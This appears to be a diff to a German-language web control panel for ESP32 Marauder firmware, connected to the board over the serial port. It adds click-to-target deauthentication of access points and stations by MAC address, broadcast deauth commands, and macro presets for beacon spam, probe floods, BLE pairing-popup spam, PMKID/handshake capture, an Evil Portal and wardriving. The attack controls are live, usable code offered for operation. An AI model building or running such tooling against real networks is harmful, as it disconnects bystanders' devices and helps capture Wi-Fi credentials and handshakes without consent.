@@ -249,7 +249,7 @@
       </div>
 
       <h3>Access Points (WLAN-Netze) <span class="tcount">(<span id="apCount">0</span>)</span>
-        <button class="btn" id="apSelMarked" style="padding:4px 8px" title="Alle angehakten APs als Angriffsziel markieren (select -a).">angehakte als Ziel (select -a)</button>
+        <button class="btn" id="apSelMarked" style="padding:4px 8px" title="Angehakte APs sind bereits Ziele — hier direkt zum Attack-Tab springen.">angehakte APs → Attack-Tab</button>
         <button class="btn" id="apClear" style="padding:4px 8px">Tabelle leeren</button>
       </h3>
       <div class="hint">Ein Access Point = ein WLAN-Router/Netz. <b>select</b> in der Zeile markiert ihn als Ziel für Deauth / Beacon-Clone / Probe.</div>
@@ -259,7 +259,7 @@
       </div>
 
       <h3>Stationen / Clients <span class="tcount">(<span id="staCount">0</span>)</span>
-        <button class="btn" id="staSelMarked" style="padding:4px 8px" title="Alle angehakten Stationen als Ziel markieren (select -c).">angehakte als Ziel (select -c)</button>
+        <button class="btn" id="staSelMarked" style="padding:4px 8px" title="Angehakte Stationen sind bereits Ziele — hier direkt zum Attack-Tab springen.">angehakte Stationen → Attack-Tab</button>
         <button class="btn" id="staClear" style="padding:4px 8px">Tabelle leeren</button>
       </h3>
       <div class="hint">Eine Station = ein mit einem AP verbundenes Gerät (Handy, Laptop). Nötig für gezielten Deauth (<code>attack -t deauth -c</code>).</div>
@@ -304,12 +304,13 @@
       </div>
 
       <h3>Deauth — Geräte vom WLAN trennen</h3>
-      <div class="hint"><b>Was:</b> Sendet „Verbindung-trennen"-Frames, sodass Geräte vom WLAN fliegen (kurzzeitig kein Internet). <b>Voraussetzung:</b> erst im WiFi-Tab scannen und Ziel markieren.</div>
+      <div class="hint"><b>Was:</b> Sendet „Verbindung-trennen"-Frames, sodass Geräte vom WLAN fliegen (kurzzeitig kein Internet). <b>Ziele</b> im WiFi-Tab anhaken — sie erscheinen hier automatisch. MAC-Modus braucht KEIN funktionierendes scanap/select.</div>
+      <div id="atkTargets" class="warnbox" style="border-color:var(--border);background:var(--panel);color:var(--muted)">Keine Ziele gewählt — im WiFi-Tab APs/Stationen anhaken.</div>
       <div class="grid g2">
-        <button class="btn atk" data-cmd="attack -t deauth" title="Trennt alle Clients der im WiFi-Tab gewählten APs (select -a). Erst scanap + AP wählen.">deauth alle Clients gewählter APs</button>
-        <button class="btn atk" data-cmd="attack -t deauth -c" title="Trennt nur die gewählten Stationen (select -c). Erst scansta + Station wählen.">deauth gezielt (gewählte Stationen)</button>
+        <button class="btn atk" id="atkDeauthAp" title="Deauth (MAC-Modus) gegen alle angehakten APs: je AP channel -s <ch> + attack -t deauth -s <AP-MAC> -d ff:ff:ff:ff:ff:ff.">deauth angehakte APs (alle Clients)</button>
+        <button class="btn atk" id="atkDeauthSta" title="Deauth gegen angehakte Stationen: je Station channel -s <ch> + attack -t deauth -d <Stations-MAC>.">deauth angehakte Stationen</button>
       </div>
-      <div class="hint">Handmodus ohne Scan: unten in der Konsole <code>attack -t deauth -s &lt;Quell-MAC&gt; -d &lt;Ziel-MAC&gt;</code> tippen.</div>
+      <div class="hint">Handmodus: unten in der Konsole <code>attack -t deauth -s &lt;Quell-MAC&gt; -d &lt;Ziel-MAC&gt;</code> tippen.</div>
 
       <h3>Beacon Spam — viele Fake-WLANs vortäuschen</h3>
       <div class="hint"><b>Was:</b> Strahlt massenhaft erfundene Netznamen aus, sodass in der WLAN-Liste der Opfer viele Fake-Netze erscheinen.</div>
@@ -447,11 +448,32 @@
       <div class="row">
         <label>Preset einfügen</label>
         <select id="macroPreset">
-          <option value="">—</option>
-          <option value="apscan">AP-Scan + Liste</option>
-          <option value="deauth">Deauth-Test (Ziel 0)</option>
-          <option value="blescan">BLE-Scan</option>
-          <option value="recon">Voll-Recon (AP+STA+BLE)</option>
+          <option value="">— Preset wählen —</option>
+          <optgroup label="Scan / Recon">
+            <option value="apscan">AP-Scan nativ + Liste</option>
+            <option value="apscan_hop">AP-Suche Kanal-Hop (scanap klemmt)</option>
+            <option value="hop_on_scan">Kanal-Hopping AN + AP-Scan</option>
+            <option value="stascan">APs + Stationen</option>
+            <option value="fullrecon">Voll-Recon (AP+STA+SSID+BLE)</option>
+            <option value="pmkid_hunt">PMKID/Handshake-Jagd (alle Kanäle)</option>
+            <option value="probe_recon">Probe-Requests sammeln</option>
+          </optgroup>
+          <optgroup label="BLE">
+            <option value="blescan">BLE-Scan</option>
+            <option value="ble_recon">BLE voll (Scan+Sniff+Skimmer)</option>
+            <option value="blespam_all">BLE-Spam alle Typen</option>
+          </optgroup>
+          <optgroup label="Attack (ohne select)">
+            <option value="beacon_random">Beacon-Spam Zufall</option>
+            <option value="rickroll">Rickroll-Spam</option>
+            <option value="ssid_farm">SSID-Farm (20 Fake-Netze)</option>
+            <option value="probe_flood">Probe-Flut</option>
+          </optgroup>
+          <optgroup label="Portal / Wardrive / Wartung">
+            <option value="portal">Evil Portal starten</option>
+            <option value="wardrive">Wardrive (APs+GPS, 30s)</option>
+            <option value="reset_lists">Board-Listen leeren</option>
+          </optgroup>
         </select>
       </div>
       <textarea id="macro" style="width:100%;height:200px;font-family:monospace;font-size:12px"
@@ -472,7 +494,7 @@
         <label>Flash-Baud</label>
         <select id="flashBaud"><option>115200</option><option selected>460800</option><option>921600</option></select>
         <span id="flashLib" class="hint">Lib: —</span>
-        <label><input type="checkbox" id="fwProxy"> CORS-Proxy (falls Download blockiert)</label>
+        <label><input type="checkbox" id="fwProxy"> Proxy erzwingen (direkten Download überspringen)</label>
       </div>
 
       <!-- A: eingebautes S3-Voll-Image -->
@@ -498,7 +520,7 @@
           <button class="go" id="appFlash" style="flex:1" disabled>⚡ App flashen (@0x10000)</button>
           <button class="warnb" id="repairUni" style="flex:1" disabled>🛠 Voll-Reparatur (Bootloader+App)</button>
         </div>
-        <div id="fwStatus" class="hint"><b>App flashen</b> = Update, Board hat schon Bootloader. <b>Voll-Reparatur</b> = auch Bootloader+Partitionen neu (für leere/gebrickte Boards, jeder Chip: ESP32/S2/S3/C3). Bei „Failed to fetch": CORS-Proxy oben anhaken.</div>
+        <div id="fwStatus" class="hint"><b>App flashen</b> = Update, Board hat schon Bootloader. <b>Voll-Reparatur</b> = auch Bootloader+Partitionen neu (für leere/gebrickte Boards, jeder Chip: ESP32/S2/S3/C3). Download: bevorzugt <b>lokaler Proxy</b> (starte den Server mit <code>python serve.py</code> statt <code>http.server</code>), sonst öffentliche CORS-Proxies. „Proxy erzwingen" überspringt den Direktversuch. Klappt gar nichts: manuell (C) / flasher.marauder.gg.</div>
       </div>
 
       <!-- C: manual -->
@@ -617,16 +639,68 @@ let listMode=null,listModeUntil=0;
 
 /* ---------- Command registry ---------- */
 const CMDS=[
-  ["System","help"],["System","reboot"],["System","settings"],["System","channel"],["System","stopscan"],
-  ["System","update -w"],["System","clearlist -a"],["System","clearlist -s"],["System","clearlist -c"],
-  ["WiFi","scanap"],["WiFi","scansta"],["WiFi","list -a"],["WiFi","list -s"],["WiFi","list -c"],
-  ["WiFi","sniffbeacon"],["WiFi","sniffprobe"],["WiFi","sniffdeauth"],["WiFi","sniffpwn"],["WiFi","sniffesp"],["WiFi","sniffraw"],
-  ["Attack","attack -t deauth"],["Attack","attack -t deauth -c"],["Attack","attack -t beacon -r"],
-  ["Attack","attack -t beacon -l"],["Attack","attack -t beacon -a"],["Attack","attack -t probe"],["Attack","attack -t rickroll"],
-  ["BLE","blescan -t all"],["BLE","sniffbt"],["BLE","sniffskim"],["BLE","blespam -t apple"],["BLE","blespam -t samsung"],
-  ["BLE","blespam -t google"],["BLE","blespam -t microsoft"],["BLE","blespam -t all"],["BLE","spoofle"],
-  ["Portal","evilportal -c start"],["Portal","evilportal -c stop"],
-  ["GPS","gps"],["GPS","gpsdata"],["GPS","wardrive"],["GPS","wardrivestation"],
+  // System
+  ["System","help","Listet alle Marauder-Befehle"],
+  ["System","reboot","Board neu starten"],
+  ["System","info","Firmware-/Hardware-Info"],
+  ["System","settings","Alle Einstellungen zeigen"],
+  ["System","settings -s EnableChannelHopping true","Kanal-Hopping AN (scanap hoppt dann)"],
+  ["System","settings -s EnableChannelHopping false","Kanal-Hopping AUS"],
+  ["System","channel","Aktuellen Kanal zeigen"],
+  ["System","channel -s 6","Auf Kanal 6 setzen"],
+  ["System","stopscan","Jeden Scan/Angriff beenden"],
+  ["System","update -w","OTA-Update via WLAN"],
+  ["System","clearlist -a","AP-Liste leeren"],
+  ["System","clearlist -s","SSID-Liste leeren"],
+  ["System","clearlist -c","Stationen-Liste leeren"],
+  // SSID-Liste (fuer Beacon-Spam)
+  ["SSID","ssid -a -g 5","5 zufaellige SSIDs erzeugen"],
+  ["SSID","ssid -a -n TestNetz","SSID 'TestNetz' hinzufuegen"],
+  ["SSID","ssid -r 0","SSID Index 0 entfernen"],
+  ["SSID","list -s","SSID-Namensliste zeigen"],
+  // WiFi Scan
+  ["WiFi","scanap","Access Points scannen (fuellt Firmware-Liste)"],
+  ["WiFi","scansta","Stationen/Clients scannen (erst AP waehlen)"],
+  ["WiFi","scanall","AP + Station kombiniert scannen"],
+  ["WiFi","list -a","Gefundene APs zeigen"],
+  ["WiFi","list -c","Gefundene Stationen zeigen"],
+  ["WiFi","sniffbeacon","Beacon-Frames mithoeren (findet APs passiv)"],
+  ["WiFi","sniffprobe","Probe-Requests mithoeren (Geraetesuchen)"],
+  ["WiFi","sniffdeauth","Laufende Deauth-Angriffe erkennen"],
+  ["WiFi","sniffpwn","Pwnagotchi-Geraete erkennen"],
+  ["WiFi","sniffpmkid","PMKID/EAPOL mitschneiden (WPA-Handshake)"],
+  ["WiFi","sniffpineap","WiFi-Pineapple/KARMA erkennen"],
+  ["WiFi","sniffmultissid","Multi-SSID-APs erkennen"],
+  ["WiFi","sniffesp","Andere ESP32/ESP8266 erkennen"],
+  ["WiFi","sniffraw","Rohpaket-Aktivitaet pro Kanal"],
+  // Attack
+  ["Attack","attack -t deauth","Deauth gegen gewaehlte APs (select noetig)"],
+  ["Attack","attack -t deauth -c","Deauth gegen gewaehlte Stationen"],
+  ["Attack","attack -t deauth -s AA:BB:CC:DD:EE:FF -d ff:ff:ff:ff:ff:ff","Deauth manuell per MAC (ohne select)"],
+  ["Attack","attack -t beacon -r","Beacon-Spam Zufallsnamen"],
+  ["Attack","attack -t beacon -l","Beacon-Spam eigene SSID-Liste"],
+  ["Attack","attack -t beacon -a","Beacon-Clone gewaehlter APs (select noetig)"],
+  ["Attack","attack -t probe","Probe-Flut gegen gewaehlte APs"],
+  ["Attack","attack -t rickroll","Rickroll-SSID-Spam"],
+  // BLE
+  ["BLE","blescan -t all","Alle BLE-Geraete scannen"],
+  ["BLE","sniffbt","Bluetooth-Aktivitaet mithoeren"],
+  ["BLE","sniffskim","Kartenskimmer-BLE suchen"],
+  ["BLE","blespam -t apple","Apple-Popups fluten (Sour Apple)"],
+  ["BLE","blespam -t samsung","Samsung-Pairing-Popups"],
+  ["BLE","blespam -t google","Google Fast-Pair-Popups"],
+  ["BLE","blespam -t microsoft","Windows Swift-Pair-Popups"],
+  ["BLE","blespam -t all","Alle BLE-Spam-Typen gleichzeitig"],
+  ["BLE","spoofle","BLE-Geraet vortaeuschen"],
+  // Portal
+  ["Portal","evilportal -c start","Evil Portal starten (index.html von SD)"],
+  ["Portal","evilportal -c stop","Portal stoppen"],
+  ["Portal","evilportal -c list","Portal-HTML-Dateien auf SD listen"],
+  // GPS / Wardrive
+  ["GPS","gps","GPS-Status/Fix pruefen"],
+  ["GPS","gpsdata","Rohe GPS-Daten (Position/Zeit/Sats)"],
+  ["GPS","wardrive","APs + GPS auf SD loggen"],
+  ["GPS","wardrivestation","Stationen + GPS auf SD loggen"],
 ];
 
 /* ---------- Prefs ---------- */
@@ -638,6 +712,8 @@ loadPrefs();PKEYS.forEach(k=>{const el=$(k);if(el)el.addEventListener("change",s
 
 /* ---------- Nav ---------- */
 function showView(v){
+  // Unbekannter View-Name -> ignorieren, sonst waere die Seite leer (kein Match = alles versteckt)
+  if(!document.querySelector('.view[data-view="'+v+'"]')){append("Unbekannter Tab: "+v,"line-err");return;}
   document.querySelectorAll(".nav-item").forEach(x=>x.classList.toggle("active",x.dataset.view===v));
   document.querySelectorAll(".view").forEach(x=>x.classList.toggle("active",x.dataset.view===v));
   try{localStorage.setItem("mccView",v);}catch(e){}
@@ -720,12 +796,16 @@ function analyze(line){
     if(nm)name=nm[1].trim();
     const isSta=/client|requesting|station/i.test(line);
     const isAp=/bssid|essid|beacon|access\s*point|\bap[:\s]/i.test(line);
+    // Fuehrender Marauder-Index (z.B. "[3]" oder "3:") => ECHTER Firmware-Index (select -a passt),
+    // sonst null (passiv/Beacon-Sniff -> nicht selektierbar). Beacon-Zeilen starten mit RSSI "-70" => kein Match.
+    const im=line.match(/^\s*\[(\d+)\]/)||line.match(/^\s*(\d+)\s*[:\)]/);
+    const fwIdx=im?parseInt(im[1],10):null;
     let tgt;
     if(isSta&&!isAp)tgt="sta";else if(isAp)tgt="ap";
     else tgt=(listMode==="sta"?"sta":listMode==="ble"?"ble":"ap");
-    if(tgt==="sta"){upsertMac(staList,{rssi,ch,mac,name});renderSta();}
-    else if(tgt==="ap"){upsertMac(apList,{rssi,ch,mac,name});renderAp();}
-    else if(tgt==="ble"){upsertMac(bleList,{rssi,mac,name});renderBle();}
+    if(tgt==="sta"){upsertMac(staList,{rssi,ch,mac,name},fwIdx);renderSta();}
+    else if(tgt==="ap"){upsertMac(apList,{rssi,ch,mac,name},fwIdx);renderAp();}
+    else if(tgt==="ble"){upsertMac(bleList,{rssi,mac,name},fwIdx);renderBle();}
     maybeSaveState();return;
   }
   // list -a mit Index aber ohne MAC (SSID-only Zeilen) -> Fallback
@@ -735,9 +815,11 @@ function analyze(line){
     else if(listMode==="sta"){upsert(staList,e);renderSta();maybeSaveState();}
   }}
 }
-function upsertMac(arr,e){const i=arr.findIndex(x=>x.mac&&x.mac.toLowerCase()===e.mac.toLowerCase());
-  if(i>=0){const idx=arr[i].index;Object.assign(arr[i],e);arr[i].index=idx;}
-  else{e.index=arr.length;arr.push(e);if(arr.length>400)arr.shift();}}
+function upsertMac(arr,e,fwIdx){const i=arr.findIndex(x=>x.mac&&x.mac.toLowerCase()===e.mac.toLowerCase());
+  if(i>=0){const keep=arr[i].index;Object.assign(arr[i],e);
+    // echter Firmware-Index ueberschreibt den frueher erfundenen; sonst bisherigen behalten
+    if(fwIdx!=null){arr[i].index=fwIdx;arr[i].fw=true;}else arr[i].index=keep;}
+  else{e.index=(fwIdx!=null?fwIdx:arr.length);e.fw=(fwIdx!=null);arr.push(e);if(arr.length>400)arr.shift();}}
 let stSaveT=0;function maybeSaveState(){const t=performance.now();if(t-stSaveT>2000){stSaveT=t;saveState();}}
 let bleSaveT=0;
 function upsertBle(name,mac,rssi){
@@ -766,23 +848,56 @@ function restoreState(){try{
 }catch(e){}}
 
 /* ---------- Table rendering ---------- */
-function selBtn(cmd){const b=document.createElement("button");b.className="btn";b.style.padding="3px 8px";b.textContent="select";b.onclick=()=>fire(cmd);return b;}
-function cbCell(kind,idx){const td=document.createElement("td");const c=document.createElement("input");c.type="checkbox";c.dataset.kind=kind;c.dataset.i=idx;c.onchange=updMarks;td.appendChild(c);return td;}
+function selBtn(cmd,ok){const b=document.createElement("button");b.className="btn";b.style.padding="3px 8px";b.textContent="select";
+  if(ok===false){b.disabled=true;b.title="Passiv gefunden (Beacon-Sniff) — noch NICHT in Firmware-Liste. Erst 'APs anzeigen' (list -a) bzw. Smart-Scan/scanap laufen lassen, dann selektierbar.";}
+  else b.onclick=()=>fire(cmd);return b;}
+// Clientseitige Ziel-Auswahl (per MAC) — unabhaengig vom Firmware-'select', das auf manchen Builds tot ist.
+const apTargets=new Map();   // mac -> {mac,ch,name}
+const staTargets=new Map();
+function targetMap(kind){return kind==="ap"?apTargets:staTargets;}
+function cbCell(kind,e){const td=document.createElement("td");const c=document.createElement("input");
+  c.type="checkbox";c.dataset.kind=kind;c.dataset.mac=e.mac||"";
+  c.checked=!!(e.mac&&targetMap(kind).has(e.mac));
+  c.onchange=()=>{if(!e.mac)return;const m=targetMap(kind);
+    if(c.checked)m.set(e.mac,{mac:e.mac,ch:e.ch,name:e.name});else m.delete(e.mac);
+    updMarks();renderTargets();};
+  td.appendChild(c);return td;}
 function cell(v,cls){const td=document.createElement("td");if(cls)td.className=cls;td.textContent=(v??"")+"";return td;}
 function renderAp(){const tb=$("apRows");tb.innerHTML="";apList.forEach(e=>{const tr=document.createElement("tr");
-  tr.appendChild(cbCell("ap",e.index));[e.index,e.rssi,e.ch].forEach(v=>tr.appendChild(cell(v)));
-  tr.appendChild(cell(e.mac,"mac"));tr.appendChild(cell(e.name));const td=document.createElement("td");td.appendChild(selBtn("select -a "+e.index));tr.appendChild(td);tb.appendChild(tr);});
+  tr.appendChild(cbCell("ap",e));[e.index,e.rssi,e.ch].forEach(v=>tr.appendChild(cell(v)));
+  tr.appendChild(cell(e.mac,"mac"));tr.appendChild(cell(e.name));const td=document.createElement("td");
+  td.appendChild(selBtn("select -a "+e.index,e.fw));
+  // Manueller Deauth ohne Firmware-select: funktioniert auch fuer passiv (sniffbeacon) gefundene APs
+  if(e.mac){const d=document.createElement("button");d.className="btn";d.style.cssText="padding:3px 8px;margin-left:4px";
+    d.textContent="deauth (MAC)";
+    d.title="Deauth ohne select: setzt AP-Kanal, dann attack -t deauth -s "+e.mac+" -d ff:ff:ff:ff:ff:ff (trennt alle Clients dieses AP).";
+    d.onclick=async()=>{if(e.ch)await fire("channel -s "+e.ch);await fire("attack -t deauth -s "+e.mac+" -d ff:ff:ff:ff:ff:ff");};
+    td.appendChild(d);}
+  tr.appendChild(td);tb.appendChild(tr);});
   $("apCount").textContent=apList.length;updDashCounts();}
 function renderSta(){const tb=$("staRows");tb.innerHTML="";staList.forEach(e=>{const tr=document.createElement("tr");
-  tr.appendChild(cbCell("sta",e.index));[e.index,e.rssi,e.ch].forEach(v=>tr.appendChild(cell(v)));
-  tr.appendChild(cell(e.mac,"mac"));tr.appendChild(cell(e.name));const td=document.createElement("td");td.appendChild(selBtn("select -c "+e.index));tr.appendChild(td);tb.appendChild(tr);});
+  tr.appendChild(cbCell("sta",e));[e.index,e.rssi,e.ch].forEach(v=>tr.appendChild(cell(v)));
+  tr.appendChild(cell(e.mac,"mac"));tr.appendChild(cell(e.name));const td=document.createElement("td");td.appendChild(selBtn("select -c "+e.index,e.fw));tr.appendChild(td);tb.appendChild(tr);});
   $("staCount").textContent=staList.length;updDashCounts();}
 function renderBle(){const tb=$("bleRows");tb.innerHTML="";bleList.forEach(e=>{const tr=document.createElement("tr");
   [e.index,e.rssi].forEach(v=>tr.appendChild(cell(v)));tr.appendChild(cell(e.mac,"mac"));tr.appendChild(cell(e.name));tb.appendChild(tr);});
   $("bleCount").textContent=bleList.length;}
-function updMarks(){const ap=document.querySelectorAll('#apRows input[type=checkbox]:checked').length;
-  const sta=document.querySelectorAll('#staRows input[type=checkbox]:checked').length;
-  $("aMarkAp").textContent=ap;$("aMarkSta").textContent=sta;}
+function updMarks(){$("aMarkAp").textContent=apTargets.size;$("aMarkSta").textContent=staTargets.size;}
+// Zeigt die gewaehlten Ziele im Attack-Tab; carry-over aus dem WiFi-Tab
+function renderTargets(){const el=$("atkTargets");if(!el)return;
+  const ap=[...apTargets.values()],sta=[...staTargets.values()];
+  if(!ap.length&&!sta.length){el.innerHTML="Keine Ziele gewählt — im WiFi-Tab APs/Stationen anhaken.";
+    if($("atkDeauthAp"))$("atkDeauthAp").disabled=true;if($("atkDeauthSta"))$("atkDeauthSta").disabled=true;return;}
+  const fmt=a=>`<code>${a.mac}</code>${a.name?" ("+a.name+")":""}${a.ch?" · Ch "+a.ch:""}`;
+  let h="";
+  if(ap.length)h+="<b>APs ("+ap.length+"):</b><br>"+ap.map(fmt).join("<br>");
+  if(sta.length)h+=(h?"<br>":"")+"<b>Stationen ("+sta.length+"):</b><br>"+sta.map(fmt).join("<br>");
+  h+='<br><button class="btn" id="atkClearTargets" style="padding:3px 8px;margin-top:6px">Ziele leeren</button>';
+  el.innerHTML=h;
+  $("atkClearTargets").onclick=()=>{apTargets.clear();staTargets.clear();renderAp();renderSta();updMarks();renderTargets();};
+  // nur den passenden Deauth-Button aktiv lassen -> kein Fehlklick
+  const a=$("atkDeauthAp"),s=$("atkDeauthSta");
+  if(a)a.disabled=!apTargets.size;if(s)s.disabled=!staTargets.size;}
 
 /* ---------- Serial ---------- */
 async function connect(){
@@ -822,8 +937,11 @@ function parseHexInput(s){const c=s.replace(/0x/gi,"").replace(/[^0-9a-fA-F]/g,"
   for(let i=0;i<a.length;i++)a[i]=parseInt(c.substr(i*2,2),16);return a;}
 function noteMode(raw){
   // -a=APs, -c=Stationen/Clients, -s=SSIDs (Marauder-Flag-Konvention)
-  if(/^(list -a|scanap)/.test(raw)){listMode="ap";listModeUntil=performance.now()+12000;setMode("Scan");}
-  else if(/^(list -c|scansta)/.test(raw)){listMode="sta";listModeUntil=performance.now()+12000;setMode("Scan");}
+  // list -a/-c = Firmware-Wahrheit -> Tabelle leeren und mit echten Indizes neu aufbauen
+  if(/^list -a/.test(raw)){apList=[];renderAp();listMode="ap";listModeUntil=performance.now()+12000;setMode("Scan");}
+  else if(/^scanap/.test(raw)){listMode="ap";listModeUntil=performance.now()+12000;setMode("Scan");}
+  else if(/^list -c/.test(raw)){staList=[];renderSta();listMode="sta";listModeUntil=performance.now()+12000;setMode("Scan");}
+  else if(/^scansta/.test(raw)){listMode="sta";listModeUntil=performance.now()+12000;setMode("Scan");}
   else if(/^list -s/.test(raw)){listMode=null;} // SSID-Namen -> keine Tabelle
   else if(/^(blescan|sniffbt|sniffskim)/.test(raw)){listMode="ble";listModeUntil=performance.now()+12000;setMode("Scan");}
   else if(/^sniffbeacon/.test(raw)){listMode="ap";listModeUntil=performance.now()+12000;setMode("Scan");}
@@ -855,8 +973,10 @@ async function smartScan(){
   if(!writer){append("Nicht verbunden.","line-err");return;}
   if(smartRunning){smartAbort=true;return;}
   smartRunning=true;smartAbort=false;$("smartScan").textContent="■ Smart-Scan stoppen";
-  append("Smart-Scan: Kanäle 1-13 werden abgesucht (sniffbeacon)...","line-sys");
+  append("Smart-Scan: Kanäle 1-13 Beacon-Sniff (findet APs auch wenn scanap klemmt)...","line-sys");
   try{
+    // sniffbeacon empfaengt zuverlaessig Beacons -> CC-Tabelle. ACHTUNG: fuellt NICHT die Firmware-Liste
+    // (access_points), darum kein 'select -a' moeglich -> Angriff via 'deauth (MAC)' pro Zeile (ohne select).
     for(let ch=1;ch<=13;ch++){
       if(smartAbort)break;
       $("smartScan").textContent="■ Smart-Scan… Kanal "+ch+"/13";
@@ -866,7 +986,7 @@ async function smartScan(){
       await new Promise(r=>setTimeout(r,1700));
     }
     await sendText("stopscan");
-    append("Smart-Scan fertig. "+apList.length+" APs in Tabelle.","line-sys");
+    append("Smart-Scan fertig. "+apList.length+" APs (passiv gefunden). Angriff pro Zeile via 'deauth (MAC)' — 'select' braucht funktionierendes scanap.","line-sys");
   }catch(e){append("Smart-Scan-Fehler: "+e.message,"line-err");}
   finally{smartRunning=false;smartAbort=false;$("smartScan").textContent="🔎 Smart-Scan (alle Kanäle)";}
 }
@@ -976,14 +1096,22 @@ function setDetectedChip(str){detectedChip=chipKey(str);
 /* ---------- FW-Liste (alle Boards) ---------- */
 const GH_API="https://api.github.com/repos/justcallmekoko/ESP32Marauder/releases?per_page=8";
 let fwAssets=[];
+const isFlipper=n=>/flipper/i.test(n);
 function fwRender(){const q=$("fwSearch").value.toLowerCase();const sel=$("fwSelect");sel.innerHTML="";
   let list=fwAssets.filter(a=>a.name.toLowerCase().includes(q));
-  // erkannten Chip nach oben
+  // Flipper-Builds sind fuer das Flipper-WLAN-Modul, NICHT fuer Standalone-Boards -> nach unten
+  list.sort((x,y)=>(isFlipper(x.name)?1:0)-(isFlipper(y.name)?1:0));
+  // erkannten Chip nach oben (staerker gewichtet als Flipper-Deprio)
   if(detectedChip){const k=detectedChip.replace("esp32","");list.sort((x,y)=>(y.name.toLowerCase().includes(k)?1:0)-(x.name.toLowerCase().includes(k)?1:0));}
   list.forEach(a=>{const o=document.createElement("option");o.value=a.url;o.dataset.name=a.name;
-    o.textContent=`${a.tag} · ${a.name} (${(a.size/1048576).toFixed(2)} MB)`;sel.appendChild(o);});
+    o.textContent=`${isFlipper(a.name)?"⚠ ":""}${a.tag} · ${a.name} (${(a.size/1048576).toFixed(2)} MB)`;sel.appendChild(o);});
   if(!list.length)sel.innerHTML="<option>— kein Treffer —</option>";
-  $("appFlash").disabled=!list.length;$("repairUni").disabled=!list.length;}
+  $("appFlash").disabled=!list.length;$("repairUni").disabled=!list.length;fwCheckPick();}
+// Warnt, wenn ein Flipper-Build fuer ein Standalone-Board gewaehlt wurde (haeufiger Fehlgriff: scanap/scansta tot)
+function fwCheckPick(){const o=$("fwSelect").selectedOptions[0];if(!o)return;
+  if(isFlipper(o.dataset.name||o.value||"")){
+    $("fwStatus").innerHTML="⚠ <b>Flipper-Build gewählt.</b> Der ist NUR fürs Flipper-Zero-WLAN-Modul — auf einem Standalone-Board sind <code>scanap</code>/<code>scansta</code> tot. Für dein DevKitC-1 einen <b>multiboardS3</b>-Build ohne 'flipper' im Namen nehmen.";}
+}
 async function fwList(){$("fwStatus").textContent="lade Build-Liste von GitHub ...";
   try{const r=await fetch(GH_API,{headers:{Accept:"application/vnd.github+json"}});if(!r.ok)throw new Error("HTTP "+r.status);
     const rels=await r.json();fwAssets=[];
@@ -991,11 +1119,35 @@ async function fwList(){$("fwStatus").textContent="lade Build-Liste von GitHub .
       fwAssets.push({name:a.name,url:a.browser_download_url,size:a.size,tag:rel.tag_name});
     fwRender();$("fwStatus").textContent=fwAssets.length+" Builds geladen. Board im Filter suchen.";}
   catch(e){$("fwStatus").textContent="Liste fehlgeschlagen ("+e.message+"). Rate-Limit? Später erneut, oder App manuell (C).";}}
+// GitHub-Release-Assets senden keine CORS-Header -> Direktversuch scheitert oft ("Failed to fetch").
+// Darum Kette: erst direkt (falls Ziel CORS liefert), dann mehrere CORS-Proxies der Reihe nach.
+const CORS_PROXIES=[
+  u=>"https://api.allorigins.win/raw?url="+encodeURIComponent(u),
+  u=>"https://thingproxy.freeboard.io/fetch/"+u,
+  u=>"https://corsproxy.io/?url="+encodeURIComponent(u)
+];
 async function fetchBin(rawUrl){
-  const url=$("fwProxy").checked?"https://corsproxy.io/?url="+encodeURIComponent(rawUrl):rawUrl;
-  const r=await fetch(url);if(!r.ok)throw new Error("HTTP "+r.status);const buf=await r.arrayBuffer();
-  const u=new Uint8Array(buf);let s="";const CH=0x8000;for(let i=0;i<u.length;i+=CH)s+=String.fromCharCode.apply(null,u.subarray(i,i+CH));
-  return {data:s,bytes:buf.byteLength};}
+  const tries=[];
+  // 1) Lokaler serve.py-Proxy (same-origin, kein CORS/403). 404 wenn nur statisch serviert -> faellt durch.
+  if((location.protocol==="http:"||location.protocol==="https:")&&location.origin)
+    tries.push({url:location.origin+"/proxy?url="+encodeURIComponent(rawUrl),via:"lokal"});
+  if(!$("fwProxy").checked)tries.push({url:rawUrl,via:"direkt"});
+  for(const p of CORS_PROXIES)tries.push({url:p(rawUrl),via:"Proxy"});
+  let last="";
+  for(const t of tries){
+    try{
+      const r=await fetch(t.url);
+      if(!r.ok){last="HTTP "+r.status+" ("+t.via+")";flog("Quelle "+t.via+" -> "+last);continue;}
+      const buf=await r.arrayBuffer();
+      // Proxy-Fehlerseiten sind winzig/HTML -> als ungueltiges Firmware-Image verwerfen
+      if(buf.byteLength<2048){last="Antwort zu klein ("+buf.byteLength+" B, "+t.via+")";flog(last);continue;}
+      const u=new Uint8Array(buf);let s="";const CH=0x8000;
+      for(let i=0;i<u.length;i+=CH)s+=String.fromCharCode.apply(null,u.subarray(i,i+CH));
+      if(t.via!=="direkt")flog("Download via "+t.via+" ok ("+buf.byteLength+" B).");
+      return {data:s,bytes:buf.byteLength};
+    }catch(e){last=(e.message||"Fehler")+" ("+t.via+")";flog("Quelle "+t.via+" -> "+last);}
+  }
+  throw new Error("Download fehlgeschlagen: "+last+" — alle Quellen/Proxies erschoepft. Nutze manuell (C) oder flasher.marauder.gg.");}
 
 /* App-Only-Flash @0x10000 (universal, jeder Chip mit vorhandenem Bootloader) */
 async function appFlash(){
@@ -1136,11 +1288,30 @@ function parseSetting(line){
 }
 
 /* ---------- Macros ---------- */
+// Kanal-Hop-Sniff 1-13: findet APs/Pakete auch wenn scanap nicht hoppt/klemmt
+function hopSniff(cmd,ms){return Array.from({length:13},(_,i)=>`channel -s ${i+1}\n${cmd}\nwait ${ms}\nstopscan`).join("\n");}
 const MACRO_PRESETS={
-  apscan:"scanap\nwait 8000\nstopscan\nlist -a",
-  deauth:"scanap\nwait 6000\nstopscan\nselect -a 0\nattack -t deauth\nwait 5000\nstopscan",
-  blescan:"blescan -t all\nwait 8000\nstopscan",
-  recon:"scanap\nwait 8000\nstopscan\nlist -a\nscansta\nwait 8000\nstopscan\nlist -s\nblescan -t all\nwait 8000\nstopscan"
+  // --- Scan / Recon ---
+  apscan:"# AP-Scan (nativ, braucht funktionierendes scanap)\nscanap\nwait 10000\nstopscan\nlist -a",
+  apscan_hop:"# AP-Suche via Beacon-Sniff auf ALLEN Kanaelen (wenn scanap klemmt)\n"+hopSniff("sniffbeacon",1500),
+  stascan:"# APs + verbundene Stationen\nscanap\nwait 8000\nstopscan\nlist -a\nscansta\nwait 8000\nstopscan\nlist -c",
